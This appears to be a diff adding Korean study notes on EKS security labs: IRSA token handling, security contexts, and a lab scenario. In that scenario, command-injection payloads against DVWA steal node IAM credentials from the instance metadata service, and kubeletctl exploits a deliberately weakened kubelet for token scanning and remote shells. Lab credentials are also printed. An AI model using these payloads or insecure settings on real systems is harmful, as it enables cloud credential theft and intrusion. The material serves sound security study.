@@ -747,16 +747,861 @@ kubectl api-resources -v5
 
 ### EKS IRSA
 
+동작 : k8s파드 → AWS 서비스 사용 시 ⇒ AWS STS/IAM ↔ IAM OIDC Identity Provider(EKS IdP) 인증/인가
 
+**Pod별 IAM 할당 방법**
 
+1. 하나의 노드에는 여러 개의 Pod가 실행될 수 있고 각 Pod별로 사용하는 AWS 서비스가 다를 수 있다.
 
+2. 이때 각 Pod별로 IAM 역할을 할당하는 가장 쉬운 방법은 Application 내에 Access Key를 하드코딩하는 방법이다.
 
+3. 이는 보안상의 이유로 바람직하지 못한 방법이고 Node의 IAM role을 모든 Pod가 공유하는 방법도 최소 권한 원칙에 위배된다.
 
+4. 이를 위해서 Pod별로 Servic Account에 IAM Role을 binding해서 Pod별로 서로 다른 IAM Role을 갖도록 하는 기능이 IAM Role for Service Account, 줄여서 **IRSA**라고 한다.
 
+5. IAM Role for Service Account, 줄여서 **IRSA**라고 한다.
 
+**실습1**
 
+```
+# 파드1 생성
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: eks-iam-test1
+spec:
+  containers:
+    - name: my-aws-cli
+      image: amazon/aws-cli:latest
+      args: ['s3', 'ls']
+  restartPolicy: Never
+  automountServiceAccountToken: false
+EOF
 
+# 확인
+kubectl get pod
+kubectl describe pod
 
+# 로그 확인
+kubectl logs eks-iam-test1
+
+# 파드1 삭제
+kubectl delete pod eks-iam-test1
+```
+
+**CloudTrail 이벤트 ListBuckets 확인**
+
+![image](https://github.com/jiwonYun9332/AWES-1/blob/ba3a066cfb3c05234740837fa04183a9bbd0ec82/Study/images/112_image.jpg)
+
+실습2 - Kubernetes Service Accounts
+
+```
+# 파드2 생성
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: eks-iam-test2
+spec:
+  containers:
+    - name: my-aws-cli
+      image: amazon/aws-cli:latest
+      command: ['sleep', '36000']
+  restartPolicy: Never
+EOF
+
+# 확인
+kubectl get pod
+kubectl describe pod
+
+# aws 서비스 사용 시도
+kubectl exec -it eks-iam-test2 -- aws s3 ls
+
+# 서비스 어카운트 토큰 확인
+SA_TOKEN=$(kubectl exec -it eks-iam-test2 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+echo $SA_TOKEN
+```
+
+![image](https://github.com/jiwonYun9332/AWES-1/blob/ff8c702bd7e5ab196d2471132f4ec85fc33bb112/Study/images/113_image.jpg)
+
+**실습3**
+
+```
+# Create an iamserviceaccount - AWS IAM role bound to a Kubernetes service account
+eksctl create iamserviceaccount \
+  --name my-sa \
+  --namespace default \
+  --cluster $CLUSTER_NAME \
+  --approve \
+  --attach-policy-arn $(aws iam list-policies --query 'Policies[?PolicyName==`AmazonS3ReadOnlyAccess`].Arn' --output text)
+
+# 확인 >> 웹 관리 콘솔에서 CloudFormation Stack >> IAM Role 확인
+NAMESPACE       NAME                            ROLE ARN
+default         my-sa                           arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
+kube-system     aws-load-balancer-controller    arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-kube-sy-Role1-PWWPESIC5H4U
+
+# Inspecting the newly created Kubernetes Service Account, we can see the role we want it to assume in our pod.
+kubectl get sa
+kubectl describe sa my-sa
+Name:                my-sa
+Namespace:           default
+Labels:              app.kubernetes.io/managed-by=eksctl
+Annotations:         eks.amazonaws.com/role-arn: arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
+Image pull secrets:  <none>
+Mountable secrets:   <none>
+Tokens:              <none>
+Events:              <none>
+```
+
+**Now let’s see what happens when we use this new Service Account within a Kubernetes Pod**
+
+```
+# 파드3번 생성
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: eks-iam-test3
+spec:
+  serviceAccountName: my-sa
+  containers:
+    - name: my-aws-cli
+      image: amazon/aws-cli:latest
+      command: ['sleep', '36000']
+  restartPolicy: Never
+EOF
+
+# 해당 SA를 파드가 사용 시 mutatingwebhook으로 Env,Volume 추가함
+kubectl get mutatingwebhookconfigurations pod-identity-webhook -o yaml | kubectl neat | yh
+
+# 파드 생성 yaml에 없던 내용이 추가됨!!!!!
+# Pod Identity Webhook은 mutating webhook을 통해 아래 Env 내용과 1개의 볼륨을 추가함
+kubectl get pod eks-iam-test3
+kubectl describe pod eks-iam-test3
+
+Environment:
+      AWS_STS_REGIONAL_ENDPOINTS:   regional
+      AWS_DEFAULT_REGION:           ap-northeast-2
+      AWS_REGION:                   ap-northeast-2
+      AWS_ROLE_ARN:                 arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452
+      AWS_WEB_IDENTITY_TOKEN_FILE:  /var/run/secrets/eks.amazonaws.com/serviceaccount/token
+
+# 파드에서 aws cli 사용 확인
+eksctl get iamserviceaccount --cluster $CLUSTER_NAME
+kubectl exec -it eks-iam-test3 -- aws sts get-caller-identity --query Arn
+"arn:aws:sts::485702506058:assumed-role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452/botocore-session-1685816069"
+```
+
+If we inspect the Pod using Kubectl and jq, we can see there are now two volumes mounted into our Pod.
+
+```
+# 파드에 볼륨 마운트 2개 확인
+kubectl get pod eks-iam-test3 -o json | jq -r '.spec.containers | .[].volumeMounts'
+[
+  {
+    "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
+    "name": "kube-api-access-zdpzp",
+    "readOnly": true
+  },
+  {
+    "mountPath": "/var/run/secrets/eks.amazonaws.com/serviceaccount",
+    "name": "aws-iam-token",
+    "readOnly": true
+  }
+]
+
+kubectl get pod eks-iam-test3 -o json | jq -r '.spec.volumes[] | select(.name=="aws-iam-token")'
+{
+  "name": "aws-iam-token",
+  "projected": {
+    "defaultMode": 420,
+    "sources": [
+      {
+        "serviceAccountToken": {
+          "audience": "sts.amazonaws.com",
+          "expirationSeconds": 86400,
+          "path": "token"
+        }
+      }
+    ]
+  }
+}
+
+# api 리소스 확인
+kubectl api-resources |grep hook
+mutatingwebhookconfigurations                  admissionregistration.k8s.io/v1        false        MutatingWebhookConfiguration
+validatingwebhookconfigurations                admissionregistration.k8s.io/v1        false        ValidatingWebhookConfiguration
+
+kubectl get MutatingWebhookConfiguration
+
+NAME                              WEBHOOKS   AGE
+aws-load-balancer-webhook         3          70m
+kube-prometheus-stack-admission   1          68m
+pod-identity-webhook              1          100m
+vpc-resource-mutating-webhook     1          100m
+
+# pod-identity-webhook 확인
+kubectl describe MutatingWebhookConfiguration pod-identity-webhook 
+kubectl get MutatingWebhookConfiguration pod-identity-webhook -o yaml | yh=
+```
+
+If we exec into the running Pod and inspect this token, we can see that it looks slightly different from the previous SA Token.
+
+```
+# AWS_WEB_IDENTITY_TOKEN_FILE 확인
+IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
+echo $IAM_TOKEN
+```
+
+JWT 웹 확인 
+
+![image](https://github.com/jiwonYun9332/AWES-1/blob/ebdfba7dccbc308536be0006ea4a6f57990bccbc/Study/images/114_image.jpg)
+
+```
+# env 변수 확인
+[
+  {
+    "name": "AWS_STS_REGIONAL_ENDPOINTS",
+    "value": "regional"
+  },
+  {
+    "name": "AWS_DEFAULT_REGION",
+    "value": "ap-northeast-2"
+  },
+  {
+    "name": "AWS_REGION",
+    "value": "ap-northeast-2"
+  },
+  {
+    "name": "AWS_ROLE_ARN",
+    "value": "arn:aws:iam::485702506058:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452"
+  },
+  {
+    "name": "AWS_WEB_IDENTITY_TOKEN_FILE",
+    "value": "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
+  }
+]
+```
+
+Now that our workload has a token it can use to attempt to authenticate with IAM, the next part is getting AWS IAM to trust these tokens. AWS IAM supports federated identities using OIDC identity providers. This feature allows IAM to authenticate AWS API calls with supported identity providers after receiving a valid OIDC JWT. This token can then be passed to AWS STS AssumeRoleWithWebIdentity API operation to get temporary IAM credentials.
+
+The OIDC JWT token we have in our Kubernetes workload is cryptographically signed, and IAM should trust and validate these tokens before the AWS STS AssumeRoleWithWebIdentity API operation can send the temporary credentials. As part of the Service Account Issuer Discovery feature of Kubernetes, EKS is hosting a public OpenID provider configuration document (Discovery endpoint) and the public keys to validate the token signature (JSON Web Key Sets – JWKS) at https://OIDC_PROVIDER_URL/.well-known/openid-configuration.
+
+```
+# Let’s take a look at this endpoint. We can use the aws eks describe-cluster command to get the OIDC Provider URL.
+IDP=$(aws eks describe-cluster --name myeks --query cluster.identity.oidc.issuer --output text)
+
+# Reach the Discovery Endpoint
+curl -s $IDP/.well-known/openid-configuration | jq -r '.'
+
+# In the above output, you can see the jwks (JSON Web Key set) field, which contains the set of keys containing the public keys used to verify JWT (JSON Web Token). 
+# Refer to the documentation to get details about the JWKS properties.
+curl -s $IDP/keys | jq -r '.'
+```
+![image](https://github.com/jiwonYun9332/AWES-1/blob/4c4d3d0374e1e758034322079d56f7f9cdf900b1/Study/images/115_image.jpg)
+
+IRSA를 가장 취약하게 사용하는 방법
+
+```
+# AWS_WEB_IDENTITY_TOKEN_FILE 토큰 값 변수 지정
+IAM_TOKEN=$(kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
+echo $IAM_TOKEN
+
+# ROLE ARN 확인 후 변수 직접 지정
+eksctl get iamserviceaccount --cluster $CLUSTER_NAME
+ROLE_ARN=<각자 자신의 ROLE ARN>
+
+# assume-role-with-web-identity STS 임시자격증명 발급 요청
+aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --role-session-name mykey --web-identity-token $IAM_TOKEN | jq
+{
+  "Credentials": {
+    "AccessKeyId": "ASIAXCFRACZFIKRGFY7S",
+    "SecretAccessKey": "s8Z6AFtrNoKdRXgGyqAD4L2XRdVnaYvG0MfDrzco",
+    "SessionToken": "IQoJb3JpZ2luX2VjELv//////////wEaDmFwLW5vcnRoZWFzdC0yIkgwRgIhAL0qZa+EOvb3978UoQ7+NjRO0GFmvnI5Be+mWrkIbdbDAiEAiFBbZhU2FPUyvahSY8RbS+QdtAXFSFzFnD+PLxPb7AUq+QQI9P//////////ARAAGgw0ODU3MDI1MDYwNTgiDDqhrQWZYvPxsiROEyrNBDLHA2fdiUjxmcYPifal/REzWjIDOoyr1Oc92sEn7+tuIDLnVqVtJ7Y7vLBwe8xR8zmoqL2zM2Hf/20xqSXyPOx8vvn+LV3+r1MXy8e+QxbKSBfAoFBerbPoiwv04qE+0z9IKbosreSBnB9m+eYz20rhkk+JaToRsokuHqwTDpQGbawgQJQKPW6PYvktbYh1aZlEjaHLzfpY9Pyxjjv2E4PPz2fSX02PkvBcew3pLtJsJUGgCqufrKr10bUPOY/nqfVeyQ5Y0i/725Jq5pa7+OkV9Ffe/ARYM8vV46BD2VEJ9vYu4dy5Y56p5QsLhMqu30YFwCGovDYbys0cX8RYJzJxzHfd244rHcjNuBA2EaX8EiIYqCbXTgk5fRamqH1USRokX9p95LMXh3qWq2CvqX8/X3/tkfl+HC6iIQ3+Sb+XzsB+iB6CvT0BSzJZDTynV/O7vedARUmjCPLPAHUTqIMgK9w8goGiBJ2uXFjMr3Ha+3nNHO+7sSiXaCvDXJTPhxYITq0aGTPkD00GxUdKZo9LWbmz5G22N9/fi0GGP8NMDhn0/mZpLZF79Fckcx6mQqX9wKYLyck/DMhCDUT4xtLf7MuPFoZNxstHjttQ9QxKPE3e9JFKl6fKsmnoWm7qPdnN90VEAqBYbYubn0WQCjVGn1ZUbltzomACUIFH0lIrD972IkE810Gb/EOk8mYIUhYSEPfL0FVYa495pFppq4JRibBwj12zaEeX+PbgdmpYA3SPesMHxBvqk4yRZHRUqz2WmvEHR97htGXXd/Mw75PuowY6mQFrh+WuPmjU1pESoLaivbbG76P3jUfk/xLdWfTgqbwi5IYaJERf31ZnOAEnUfvQkdVJCnUcDcCfoRpJB2PUZPdCVA04NZq6o4WPl62SkZUOZLuUWYQPJAWylpp3d9okUr0B96s3HkR/A5w2RDVOYtfXg/izTcqSaUH451Cmp/ukIkDS/mAb7IOzPxoKTdJzWpvE0Zunti+aBmk=",
+    "Expiration": "2023-06-03T19:43:59+00:00"
+  },
+  "SubjectFromWebIdentityToken": "system:serviceaccount:default:my-sa",
+  "AssumedRoleUser": {
+    "AssumedRoleId": "AROAXCFRACZFMAZG4WLJ3:mykey",
+    "Arn": "arn:aws:sts::485702506058:assumed-role/eksctl-myeks-addon-iamserviceaccount-default-Role1-YNNHU7841452/mykey"
+  },
+  "Provider": "arn:aws:iam::485702506058:oidc-provider/oidc.eks.ap-northeast-2.amazonaws.com/id/D920C4F8BAFB246BCAA2FF943951E241",
+  "Audience": "sts.amazonaws.com"
+}
+```
+
+실습 확인 후 파드 삭제
+
+```
+kubectl delete pod eks-iam-test3
+```
+
+### OWASP Kubernetes Top Ten
+
+악성코드분석님 : EKS pod가 IMDS API를 악용하는 시나리오
+
+mysql 배포
+
+```
+cat <<EOT > mysql.yaml
+apiVersion: v1
+kind: Secret
+metadata:
+  name: dvwa-secrets
+type: Opaque
+data:
+  # s3r00tpa55
+  ROOT_PASSWORD: czNyMDB0cGE1NQ==
+  # dvwa
+  DVWA_USERNAME: ZHZ3YQ==
+  # p@ssword
+  DVWA_PASSWORD: cEBzc3dvcmQ=
+  # dvwa
+  DVWA_DATABASE: ZHZ3YQ==
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: dvwa-mysql-service
+spec:
+  selector:
+    app: dvwa-mysql
+    tier: backend
+  ports:
+    - protocol: TCP
+      port: 3306
+      targetPort: 3306
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dvwa-mysql
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: dvwa-mysql
+      tier: backend
+  template:
+    metadata:
+      labels:
+        app: dvwa-mysql
+        tier: backend
+    spec:
+      containers:
+        - name: mysql
+          image: mariadb:10.1
+          resources:
+            requests:
+              cpu: "0.3"
+              memory: 256Mi
+            limits:
+              cpu: "0.3"
+              memory: 256Mi
+          ports:
+            - containerPort: 3306
+          env:
+            - name: MYSQL_ROOT_PASSWORD
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: ROOT_PASSWORD
+            - name: MYSQL_USER
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_USERNAME
+            - name: MYSQL_PASSWORD
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_PASSWORD
+            - name: MYSQL_DATABASE
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_DATABASE
+EOT
+kubectl apply -f mysql.yaml
+```
+
+dvwa 배포
+
+```
+cat <<EOT > dvwa.yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: dvwa-config
+data:
+  RECAPTCHA_PRIV_KEY: ""
+  RECAPTCHA_PUB_KEY: ""
+  SECURITY_LEVEL: "low"
+  PHPIDS_ENABLED: "0"
+  PHPIDS_VERBOSE: "1"
+  PHP_DISPLAY_ERRORS: "1"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: dvwa-web-service
+spec:
+  selector:
+    app: dvwa-web
+  type: ClusterIP
+  ports:
+    - protocol: TCP
+      port: 80
+      targetPort: 80
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dvwa-web
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: dvwa-web
+  template:
+    metadata:
+      labels:
+        app: dvwa-web
+    spec:
+      containers:
+        - name: dvwa
+          image: cytopia/dvwa:php-8.1
+          ports:
+            - containerPort: 80
+          resources:
+            requests:
+              cpu: "0.3"
+              memory: 256Mi
+            limits:
+              cpu: "0.3"
+              memory: 256Mi
+          env:
+            - name: RECAPTCHA_PRIV_KEY
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: RECAPTCHA_PRIV_KEY
+            - name: RECAPTCHA_PUB_KEY
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: RECAPTCHA_PUB_KEY
+            - name: SECURITY_LEVEL
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: SECURITY_LEVEL
+            - name: PHPIDS_ENABLED
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: PHPIDS_ENABLED
+            - name: PHPIDS_VERBOSE
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: PHPIDS_VERBOSE
+            - name: PHP_DISPLAY_ERRORS
+              valueFrom:
+                configMapKeyRef:
+                  name: dvwa-config
+                  key: PHP_DISPLAY_ERRORS
+            - name: MYSQL_HOSTNAME
+              value: dvwa-mysql-service
+            - name: MYSQL_DATABASE
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_DATABASE
+            - name: MYSQL_USERNAME
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_USERNAME
+            - name: MYSQL_PASSWORD
+              valueFrom:
+                secretKeyRef:
+                  name: dvwa-secrets
+                  key: DVWA_PASSWORD
+EOT
+kubectl apply -f dvwa.yaml
+```
+
+ingress 배포
+```
+cat <<EOT > dvwa-ingress.yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  annotations:
+    alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN
+    alb.ingress.kubernetes.io/group.name: study
+    alb.ingress.kubernetes.io/listen-ports: '[{"HTTPS":443}, {"HTTP":80}]'
+    alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb
+    alb.ingress.kubernetes.io/scheme: internet-facing
+    alb.ingress.kubernetes.io/ssl-redirect: "443"
+    alb.ingress.kubernetes.io/success-codes: 200-399
+    alb.ingress.kubernetes.io/target-type: ip
+  name: ingress-dvwa
+spec:
+  ingressClassName: alb
+  rules:
+  - host: dvwa.$MyDomain
+    http:
+      paths:
+      - backend:
+          service:
+            name: dvwa-web-service
+            port:
+              number: 80
+        path: /
+        pathType: Prefix
+EOT
+kubectl apply -f dvwa-ingress.yaml
+echo -e "DVWA Web https://dvwa.$MyDomain"
+```
+
+웹 접속 admin / password → DB 구성을 위해 클릭 (재로그인) ⇒ admin / password
+
+Command Injection 메뉴 클릭
+
+```
+# 명령 실행 가능 확인
+8.8.8.8 ; echo ; hostname
+8.8.8.8 ; echo ; whoami
+
+# IMDSv2 토큰 복사해두기
+8.8.8.8 ; curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==
+
+# EC2 Instance Profile (IAM Role) 이름 확인
+8.8.8.8 ; curl -s -H "X-aws-ec2-metadata-token: AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==" –v http://169.254.169.254/latest/meta-data/iam/security-credentials/
+eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1
+
+# EC2 Instance Profile (IAM Role) 자격증명탈취 
+8.8.8.8 ; curl -s -H "X-aws-ec2-metadata-token: AQAEAPzvoKtb-e69dmSRr4PVdKTrbiDEVHf2Cpygxa7FF_vNpquhWQ==" –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-RIQSTAN95G8X
+```
+
+![image](https://github.com/jiwonYun9332/AWES-1/blob/ae855079ea07d313d39298ceda96efd567ba0e7f/Study/images/116_image.jpg)
+
+![image](https://github.com/jiwonYun9332/AWES-1/blob/ae855079ea07d313d39298ceda96efd567ba0e7f/Study/images/117_image.jpg)
+
+Low Command Injection Source
+
+```
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "<pre>{$cmd}</pre>";
+}
+
+?>
+```
+
+Medium Command Injection Source
+
+```
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // Set blacklist
+    $substitutions = array(
+        '&&' => '',
+        ';'  => '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "<pre>{$cmd}</pre>";
+}
+
+?>
+```
+
+Kubelet 미흡한 인증/인가 설정 시 위험 + kubeletct 툴
+
+```
+# 노드의 kubelet API 인증과 인가 관련 정보 확인
+ssh ec2-user@$N1 cat /etc/kubernetes/kubelet/kubelet-config.json | jq
+ssh ec2-user@$N1 cat /var/lib/kubelet/kubeconfig | yh
+
+# 노드의 kubelet 사용 포트 확인 
+ssh ec2-user@$N1 sudo ss -tnlp | grep kubelet
+LISTEN 0      4096       127.0.0.1:10248      0.0.0.0:*    users:(("kubelet",pid=2940,fd=20))
+LISTEN 0      4096               *:10250            *:*    users:(("kubelet",pid=2940,fd=21))
+
+# 데모를 위해 awscli 파드 생성
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: myawscli
+spec:
+  #serviceAccountName: my-sa
+  containers:
+    - name: my-aws-cli
+      image: amazon/aws-cli:latest
+      command: ['sleep', '36000']
+  restartPolicy: Never
+EOF
+
+# 파드 사용
+kubectl exec -it myawscli -- aws sts get-caller-identity --query Arn
+kubectl exec -it myawscli -- aws s3 ls
+kubectl exec -it myawscli -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
+kubectl exec -it myawscli -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
+```
+
+[myeks-bastion-2] kubeletct 설치 및 사용
+
+```
+# 기존 kubeconfig 삭제
+rm -rf ~/.kube
+
+# 다운로드
+curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
+kubeletctl version
+kubeletctl help
+
+# 노드1 IP 변수 지정
+N1=<각자 자신의 노드1의 PrivateIP>
+N1=192.168.1.153
+
+# 노드1 IP로 Scan
+kubeletctl scan --cidr $N1/32
+
+# 노드1에 kubelet API 호출 시도
+curl -k https://$N1:10250/pods; echo
+Unauthorized
+```
+
+[myeks-bastion] → 노드1 접속 : kubelet-config.json 수정
+
+```
+# 노드1 접속
+ssh ec2-user@$N1
+-----------------------------
+# 미흡한 인증/인가 설정으로 변경
+vi /etc/kubernetes/kubelet/kubelet-config.json
+...
+"authentication": {
+    "anonymous": {
+      "enabled": true
+...
+  },
+  "authorization": {
+    "mode": "AlwaysAllow",
+...
+
+# kubelet restart
+systemctl restart kubelet
+systemctl status kubelet
+```
+
+[myeks-bastion-2] kubeletct 사용
+
+```
+# 파드 목록 확인
+curl -s -k https://$N1:10250/pods | jq
+
+# kubelet-config.json 설정 내용 확인
+curl -k https://$N1:10250/configz | jq
+
+# kubeletct 사용
+# Return kubelet's configuration
+kubeletctl -s $N1 configz | jq
+
+# Get list of pods on the node
+kubeletctl -s $N1 pods 
+
+# Scans for nodes with opened kubelet API > Scans for for all the tokens in a given Node
+kubeletctl -s $N1 scan token
+
+# kubelet API로 명령 실행 : <네임스페이스> / <파드명> / <컨테이너명>
+curl -k https://$N1:10250/run/default/myawscli/my-aws-cli -d "cmd=aws --version"
+
+# Scans for nodes with opened kubelet API > remote code execution on their containers
+kubeletctl -s $N1 scan rce
+
+# Run commands inside a container
+kubeletctl -s $N1 exec "/bin/bash" -n default -p myawscli -c my-aws-cli
+--------------------------------
+export
+aws --version
+aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
+exit
+--------------------------------
+
+# Return resource usage metrics (such as container CPU, memory usage, etc.)
+kubeletctl -s $N1 metrics
+```
+
+### 파드/컨테이너 보안 컨텍스트
+
+컨테이너 보안 컨텍스트 SecurityContext
+
+- 각 컨테이너에 대한 보안 설정 → 침해사고 발생 시 침해사고를 당한 권한을 최대한 축소하여 그 사고에 대한 확대를 방치
+
+| 종류 | 개요 |
+| --- | --- |
+| privileged | 특수 권한을 가진 컨테이너로 실행 |
+| capabilities | Capabilities 의 추가와 삭제 |
+| allowPrivilegeEscalation | 컨테이너 실행 시 상위 프로세스보다 많은 권한을 부여할지 여부 |
+| readOnlyRootFilesystem | root 파일 시스템을 읽기 전용으로 할지 여부 |
+| runAsUser | 실행 사용자 |
+| runAsGroup | 실행 그룹 |
+| runAsNonRoot | root 에서 실행을 거부 |
+| seLinuxOptions | SELinux 옵션 |
+
+**컨테이너 보안 컨텍스트 확인 : kube-system 파드 내 컨테이너 대상**
+
+```
+kubectl get pod -n kube-system -o jsonpath={.items[*].spec.containers[*].securityContext} | jq
+{
+  "allowPrivilegeEscalation": false,
+  "readOnlyRootFilesystem": true,
+  "runAsNonRoot": true
+}
+...
+```
+
+readOnlyRootFilesystem : root 파일 시스템을 읽기 전용으로 사용
+
+```
+cat <<EOF | kubectl create -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rootfile-readonly
+spec:
+  containers:
+  - name: netshoot
+    image: nicolaka/netshoot
+    command: ["tail"]
+    args: ["-f", "/dev/null"]
+    securityContext:
+      readOnlyRootFilesystem: true
+  terminationGracePeriodSeconds: 0
+EOF
+
+# 파일 생성 시도
+kubectl exec -it rootfile-readonly -- touch /tmp/text.txt
+
+# 기존 파일 수정 시도
+kubectl exec -it rootfile-readonly -- cat /etc/hosts
+kubectl exec -it rootfile-readonly -- sh -c "echo write > /etc/hosts"
+kubectl exec -it rootfile-readonly -- cat /etc/hosts
+
+# 특정 파티션, 파일의 ro/rw 확인
+kubectl exec -it rootfile-readonly -- mount | grep hosts
+
+kubectl exec -it rootfile-readonly -- mount | grep ro
+
+## /proc, /dev, /sys/fs/cgroup, /etc/hosts, /proc/kcore, /proc/keys, /proc/timer_list
+kubectl exec -it rootfile-readonly -- mount | grep rw
+
+# 파드 상세 정보 확인
+kubectl get pod rootfile-readonly -o jsonpath={.spec.containers[0].securityContext} | jq
+```
+
+- **파드** 보안 컨텍스트
+    - 파드 레벨에서 보안 컨텍스트를 적용 : 파드에 포함된 모든 컨테이너가 영향을 받음
+    - 파드와 컨테이너 정책 중복 시, 컨테이너 정책이 우선 적용됨
+
+| 종류 | 개요 |
+| --- | --- |
+| runAsUser | 실행 사용자 |
+| runAsGroup | 실행 그룹 |
+| runAsNonRoot | root 에서 실행을 거부 |
+| supplementalGroups | 프라이머리 GUI에 추가로 부여할 GID 목록을 지정 |
+| fsGroup | 파일 시스템 그룹 지정 |
+| systls | 덮어 쓸 커널 파라미터 지정 |
+| seLinuxOptions | SELinux 옵션 지정 |
+
+**컨테이너 보안 컨텍스트 확인 : kube-system 파드 내 컨테이너 대상**
+
+```
+kubectl get pod -n kube-system -o jsonpath={.items[*].spec.securityContext} | jq
+```
+
+**sysctl을 사용한 커널 파라미터 설정**
+
+: 커널 파라미터 변경 적용을 위해서는 컨테이너에서도 설정 필요, 파드 수준 적용으로 컨테이너 간에 공유됨
+
+커널 파라미터는 안전한 것(safe)과 안전하지 않은 것(unsafe)으로 분류된다
+
+안전한 것 safe : 호스트의 커널과 적절하게 분리되어 있으며 다른 파드에 영향이 없는 것, 파드가 예상치 못한 리소스를 소비하지 않는 것
+
+- `kernel.shm_rmid_forced`
+- `net.ipv4.ip_local_port_range`
+- `net.ipv4.tcp_syncookies`
+- `net.ipv4.ping_group_range` (since Kubernetes 1.18),
+- `net.ipv4.ip_unprivileged_port_start` (since Kubernetes 1.22).
+
+안전하지 않은 것 unsafe : 사실상 대부분의 커널 파라미터 ⇒ 적용을 위해서는 kubelet 설정 필요
+
+```
+# Unsafe sysctls are enabled on a node-by-node basis with a flag of the kubelet
+kubelet --allowed-unsafe-sysctls 'kernel.msg*,net.core.somaxconn' ...
+```
+
+unsafe 파라미터를 변경 시도
+
+```
+cat <<EOF | kubectl create -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: unsafe
+spec:
+  securityContext:
+    sysctls:
+    - name: net.core.somaxconn
+      value: "12345"
+  containers:
+    - name: centos-container
+      image: centos:7
+      command: ["/bin/sleep", "3600"]
+  terminationGracePeriodSeconds: 0
+EOF
+
+kubectl events --for pod/unsafe
+```
 
 
 
